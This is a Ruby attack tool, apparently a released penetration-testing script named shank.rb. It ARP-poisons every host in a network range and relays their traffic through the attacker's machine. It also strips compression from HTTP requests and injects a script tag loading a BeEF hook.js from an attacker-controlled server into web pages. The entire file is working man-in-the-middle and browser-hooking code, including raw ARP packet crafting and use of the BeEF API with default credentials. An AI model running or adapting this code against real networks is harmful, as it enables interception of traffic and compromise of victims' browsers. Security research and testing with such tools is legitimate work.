#!/usr/bin/env ruby

# shank.rb - Script to autolaunch BeEF modules
# Created by Ryan Linn and Steve Ocepek
# Copyright (C) 2012 Trustwave Holdings, Inc.
#
# This program is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
# 
# You should have received a copy of the GNU General Public License
# along with this program.  If not, see <http://www.gnu.org/licenses/>.

# HTTP parsing
require 'pp'
require 'packetfu'
require 'ipaddr'
require 'thread'
require 'rest_client'
require 'json'
require 'optparse'

options = {}

ARP_TIMEOUT = 30
@beef_ip = '192.168.50.52'
@beef_user = 'beef'
@beef_pass = 'beef'
@injection = "http://#{@beef_ip}:3000/hook.js"
@beef_hooks = "http://#{@beef_ip}:3000/api/hooks"
@beef_admin = "http://#{@beef_ip}:3000/api/admin"

optparse = OptionParser.new do |opts|
  opts.banner = "Usage: shank.rb [options] CIDR"	

  options[:debug] = false
  opts.on( '-d', '--debug', 'Pring debug output' ) do
    options[:debug] = true
  end   

   opts.on( '-U', '--url URL ', 'The base URL for BeEF' ) do|url|
	@injection = "#{url}/hook.js"
	@beef_hooks = "#{url}/hooks"
	@beef_admin = "#{url}/api/admin"
	
   end

  opts.on( '-u', '--user USER', 'The BeEF Username' ) do|user|
    @beef_user = user
  end

  opts.on( '-p', '--pass PASS', 'The BeEF Password' ) do|pass|
    @beef_pass = pass
  end

   opts.on( '-h', '--help', 'Display this screen' ) do
     puts opts
     exit
   end

end

optparse.parse!

#require 'perftools'
#PerfTools::CpuProfiler.start("/tmp/shank_prof2")
#at_exit do
#  PerfTools::CpuProfiler.stop
#end

def rand_chars(len)
  (0...len).map{65.+(rand(25)).chr}.join
end

# Acts as an ARP Cache. Yay!
class ARPCache
  include Enumerable

  def initialize(timeout = ARP_TIMEOUT)
    @mutex = Mutex.new
    @timeout = timeout
    @cache = {}
  end

  # @param [String] ipaddr
  # @param [String] mac 
  def update(ipaddr, mac)
    # Make sure we sync things up when updating.
    @mutex.synchronize do
      @cache[ipaddr] = ARPEntry.new(ipaddr, mac, Time.now + @timeout)
    end
  end

  # Prunes off expired cache entries
  def prune()
    # Since we are deleting things, make sure we sync this up.
    @mutex.synchronize do
      @cache.delete_if {|ipaddr, arp_entry| arp_entry.expired?}
    end
  end

  def each
    @cache.each_value do |arp_entry|
      yield(arp_entry)
    end
  end

  # Resolves an IP address into a MAC address
  # @param [String] ipaddr
  # @return [ARPEntry, nil] returns a cached entry, if it exists
  def resolve(ipaddr)
    # Don't bother synchronizing this. The object is static, once returned. 
    # If it happened to get deleted after we retrieve it, no big deal.
    @cache[ipaddr]
  end
end

class ARPEntry 
  attr_reader :ip, :mac
  def initialize(ip, mac, expiry)
    @ip = ip
    @mac = mac
    @expiry = expiry
  end

  def mac_raw()
    @mac.split(":").map {|x| x.to_i(16)}.pack("cccccc")
  end

  def expired?
    Time.now > @expiry
  end

  def to_s
    "#{@ip} : #{@mac}"
  end
end

class Shank
  attr_reader :ip, :ipr, :packetfu_conf, :arp_cache, :interface
  # @param [String] ip The ip address or range that you want to poison
  # @param [String] interface (eth0) The interface to poison through
  def initialize(ip, interface = "eth0")
    @inject_queue = Queue.new
    @ip = IPAddr.new(ip)
    @ipr = @ip.to_range
    @arp_cache = ARPCache.new
    @interface = interface
    
    # Not sure about this being the best way to do this stuff.
    @packetfu_conf = PacketFu::Config.new(PacketFu::Utils.whoami?(:iface => @interface)).config

    @inject = Pcap.open_live(@interface,0xffff,false,1)
    @inject_thread = start_inject_thread()
  end

  def start_inject_thread()
    Thread.new do
      while packet_s = @inject_queue.pop()
        @inject.inject(packet_s)
      end
    end
  end

  def inject_raw(packet_s)
    @inject_queue.push(packet_s)
  end

  def inject(packet)
    inject_raw(packet.to_s)
  end

  def interface_ether_raw
    @packetfu_conf[:eth_src]
  end

  def interface_ether
    @packetfu_conf[:eth_saddr]
  end

  def interface_ipaddr_raw
    [@packetfu_conf[:ip_src]].pack("N")
  end

  def interface_ipaddr
    @packetfu_conf[:ip_saddr]
  end

  def gateway_ether_raw
    @packetfu_conf[:eth_dst]
  end

  def gateway_ether
    @packetfu_conf[:eth_daddr]
  end

  # Indicates whether ipaddr is in scope for poisoning
  # @param [String] ipaddr
  # @return [Boolean] true if it is in scope
  def in_scope?(ipaddr)
    @ip.include?(ipaddr)
  end

  # Enumerates through all of the in-scope IP addresses
  def each_in_scope_ipaddr
    @ip.to_range.each do |ipaddr|
      yield(ipaddr)
    end
  end

  def route_raw_ip_packet(raw_packet)
    route_ip_packet(PacketFu::IPPacket.new.read(raw_packet))
  end

  def route_ip_packet(packet)
    d_addr = packet.ip_daddr
    s_addr = packet.ip_saddr
    #puts "route0 #{s_addr} -> #{d_addr}"
    if self.in_scope?(d_addr) # If it's in our defined range
      if arp_entry = self.arp_cache.resolve(d_addr)
        packet.eth_saddr = self.interface_ether
        packet.eth_daddr = arp_entry.mac
        ## We only need to recalc if we are changing the size. Nobody cares
        ## about checksums?
        #packet.recalc
        self.inject(packet)
      else 
        # We effectively 'drop' the packet (it'll probably get retransmitted), 
        # and kick out an ARP request. maybe we'll have an arp entry by the next
        # time this packet comes through
        arp_request(d_addr)
      end
    else # send to gw mac 
     # puts "route2"
      packet.eth_saddr = self.interface_ether
      packet.eth_daddr = self.gateway_ether
      ## We only need to recalc if we are changing the size. Nobody cares
      ## about checksums?
      # packet.recalc
      self.inject(packet)
    end
  end

  def hton(ip)
    ip.split(".").map {|x| x.to_i}.pack("cccc")
  end

  ARP_TEMPLATE = "%s"+
               "%s" +
               "\x08\x06" + # ARP
               "\x00\x01" + # Hardware type: ETHER
               "\x08\x00" + # Protocol type: IP
               "\x06"     + # Hardware size
               "\x04"     + # Protocol size
               "\x00\x01" + # Opcode: Request (1)
               "%s" + # Sender mac addr
               "%s" + # Sender IP Address
               "%s" + # Target mac address
               "%s" + 
               ("\x00" * 18)

  def create_arp_request(dst_mac_raw, 
                      src_mac_raw, 
                      arp_sender_mac_raw, 
                      arp_sender_ip_raw, 
                      arp_target_mac_raw, 
                      arp_target_ip_raw)

    ARP_TEMPLATE % [dst_mac_raw, 
                    src_mac_raw, 
                    arp_sender_mac_raw, 
                    arp_sender_ip_raw, 
                    arp_target_mac_raw, 
                    arp_target_ip_raw]
  end


  # Crafts a raw arp_request
  def arp_request_raw(dst_mac_raw, 
                      src_mac_raw, 
                      arp_sender_mac_raw, 
                      arp_sender_ip_raw, 
                      arp_target_mac_raw, 
                      arp_target_ip_raw)

    raw = create_arp_request(dst_mac_raw, 
                      src_mac_raw, 
                      arp_sender_mac_raw, 
                      arp_sender_ip_raw, 
                      arp_target_mac_raw, 
                      arp_target_ip_raw)

    self.inject_raw(raw)
  end

  ETHER_BCAST = "\xff\xff\xff\xff\xff\xff"
  ETHER_ANY   = "\x00\x00\x00\x00\x00\x00"

  def arp_request(ip)
    ip_raw = hton(ip)
    arp_request_raw(
      ETHER_BCAST,
      self.interface_ether_raw(),
      self.interface_ether_raw(),
      self.interface_ipaddr_raw(),
      ETHER_ANY,
      ip_raw
    )
  end
end


# The stuff below here could be cleaned up a bit more.

shank = Shank.new(ARGV[0], (ARGV[1] || "eth0"))
@alive_ips = []


arp_cap = PacketFu::Capture.new(:start => true, :filter => 
                                 "arp and not ether src " + shank.interface_ether)

http_cap = PacketFu::Capture.new(:start => true, 
                                  :filter => "(tcp[(tcp[12]>>2):4] = 0x47455420 "+
                                  "or tcp[(tcp[12]>>2):4] = 0x48545450) and "+
                                  "port 80 and ether dst " + 
                                  shank.interface_ether + 
                                  " and not ether src " + 
                                  shank.interface_ether)

tcp_cap = PacketFu::Capture.new(:start => true, 
                                 :filter => 
                                "(tcp and not port 80) or "+
                                "(port 80 and (len <= ((ip[0]&0x0f)*4 + (tcp[12]>>2) + 20))) "+
                    "or (port 80 and (tcp[(tcp[12]>>2):4] != 0x47455420 and "+
  "tcp[(tcp[12]>>2):4] != 0x48545450)) and ether dst " + 
  shank.interface_ether + " and not ether src " + shank.interface_ether)

fw_cap = PacketFu::Capture.new(:start => true, 
                                :filter => "(udp or icmp) and ether dst " + 
                                shank.interface_ether + 
                                " and not ether src " + shank.interface_ether)



arp_thread = Thread.new do
  Thread.current[:packets] = 0
  arp_cap.stream.each do |p|
    Thread.current[:packets] += 1
    arp_pkt = PacketFu::ARPPacket.new.read(p)
    if arp_pkt.arp_opcode == 1 # ARP request
      ipaddr = arp_pkt.arp_saddr_ip
      shank.arp_request(ipaddr)
      next
    elsif arp_pkt.arp_opcode == 2 # ARP reply
      ipaddr = arp_pkt.arp_saddr_ip
      macaddr = arp_pkt.arp_saddr_mac
      if shank.in_scope?(ipaddr) && # If it's in our defined range
        !macaddr.nil? &&
        ipaddr != shank.interface_ipaddr()

        shank.arp_cache.update(ipaddr, macaddr)
      end
    end
  end
end

http_thread = Thread.new do
  Thread.current[:packets] = 0
  http_cap.stream.each do |packet|
    Thread.current[:packets] += 1
    start = Time.now
    #puts "http" if options[:debug] == true
    http_pkt = PacketFu::TCPPacket.new.read(packet, :strip => true)
    payload = http_pkt.payload
    # Do stuff to it
    # From the server
    if not @alive_ips.include? http_pkt.ip_daddr and payload =~ /\A(?<header>HTTP\/\d+\.\d+ +200.*Content-type: *text\/html.*?\r?\n\r?\n)(?<body>.*)/mi
      header = $~["header"] # includes the newlines that come after the header.
      body = $~["body"] # The body!

      # Try to shrink things down a bit, whitespace-wize
      body_mod = body.gsub(/\s+/, " ")
      body_mod.gsub!(/[\r\n]/m, "")
      body_mod.gsub!(/<meta .*?>/i, "")
      # Remove spaces between tags.
      body_mod.gsub!(/>\s*</, "><")
      # Strip out comments.
      #body_mod.gsub!(/<!--.*?-->/, "")

      success = body_mod.sub!(/\><(title|head|body|meta)/i, '><script>alert(\'inject\')</script>' + "<script src=\"#{@injection}\">" + '</script><\1') != nil

      # padd things up
      delta = body.length - body_mod.length

      if delta < 0
        warn "injected into response and updated length"
        new_head = header.sub(/Content-Length: \d+/,"Content-Length: #{body_mod.length}")
        if new_head != header
          new_payload = ( new_head << body_mod )
        end
			end

      if delta >= 0
        warn "injected into response"
        # This pads a chunk of spaces to the front of the body.
        padding = " " * delta
        body_mod = (padding << body_mod)
        new_payload = (header << body_mod)
      end

      if payload != new_payload
        http_pkt.payload = new_payload
        http_pkt.recalc
        http_pkt.tcp_recalc
      end
    elsif payload[0..3] == "GET " 
    # From client 
      #Change the packet
      #warn "modding request"
      new_payload = payload
      header_regex = /^Accept-Encoding:[^\r\n]*/i
      new_header = "Accept-Encoding: identity"
      if new_payload =~ header_regex
        orig = $~[0]
        delta = orig.length - new_header.length
        if delta >= 0
          # Alright, let's replace it, but pad first.
          new_header = (new_header << (" " * delta))
          new_payload = new_payload.sub(header_regex, new_header)
          warn "request: overrode Accept-Encoding..."
          http_pkt.payload = new_payload
          http_pkt.recalc
          http_pkt.tcp_recalc
        else 
          # Alright, we can't neuter it, so let's replace it with BS.

          shorty = "#{rand_chars(orig.length/2)}: "
          padding = rand_chars(orig.length - shorty.length)
          shorty << padding

          warn "request: junked out Accept-Encoding..."
          new_payload = new_payload.sub(header_regex, shorty)
          http_pkt.payload = new_payload
          http_pkt.recalc
          http_pkt.tcp_recalc
        end
      end
    end
    #puts "gunna route http" if options[:debug] == true
    shank.route_ip_packet(http_pkt)
  end
end

# Other TCP that doesn't match GET or HTTP
tcp_thread = Thread.new do
  Thread.current[:packets] = 0
  tcp_cap.stream.each do |packet|
    Thread.current[:packets] += 1
    shank.route_raw_ip_packet(packet)
  end
end

# Catch-all, just forward otherwise
fw_thread = Thread.new do
  Thread.current[:packets] = 0
  fw_cap.stream.each do |packet|
    Thread.current[:packets] += 1
    shank.route_raw_ip_packet(packet)
  end
end

beef_thread = Thread.new do
  resp = RestClient.post "#{@beef_admin}/login",
        { 'username' => "#{@beef_user}",
        'password' => "#{@beef_pass}"}.to_json,
        :content_type => :json,
        :accept => :json
  token = JSON.parse(resp.body)['token']
  if not token
    print "Could not connect to BeEF, injection will always happen!\n"
  else
    print "BeEF Thread Started!\n"
    i = 0
    loop do
      tmp_ips = []
      resp = RestClient.get "#{@beef_hooks}", {:params => {:token => token}}
      hooks= JSON.parse(resp.body)['hooked-browsers']['online']
      hooks.each do |hook|
        tmp_ips<< hook[1]['ip']
      end
      i = i + 1
      @alive_ips = tmp_ips.dup
      if i % 6 == 0
        print "Hooked Browser Summary\n"
        pp @alive_ips
      end
      sleep 5
    end 
  end
end

# Initial arp scan
shank.each_in_scope_ipaddr do |ipaddr|
  shank.arp_request(ipaddr.to_s)
end

def thread_summary(name, thread)
  [name, thread.status, thread.join(0), thread[:packets]]
end

poison_timer = Time.now + 5
#main loop
loop do
  # Poison hosts
  if Time.now() > poison_timer
    # Prune things....
    shank.arp_cache.prune()

    puts "poison"
    shank.arp_cache.each do |arp_entry1|
      shank.arp_cache.each do |arp_entry2|
        if arp_entry1.ip != arp_entry2.ip
          shank.arp_request_raw(arp_entry1.mac_raw(),
                          shank.interface_ether_raw(),
                          shank.interface_ether_raw(),
                          shank.hton(arp_entry2.ip),
                          Shank::ETHER_ANY,
                          shank.hton(arp_entry1.ip)
                         )
        end
      end
    end
    poison_timer = Time.now() + 5
  end

  sleep 1
  thread_summary(:arp_thread, arp_thread)
  thread_summary(:http_thread, http_thread)
  thread_summary(:tcp_thread, tcp_thread)
  thread_summary(:fw_thread, fw_thread)
end
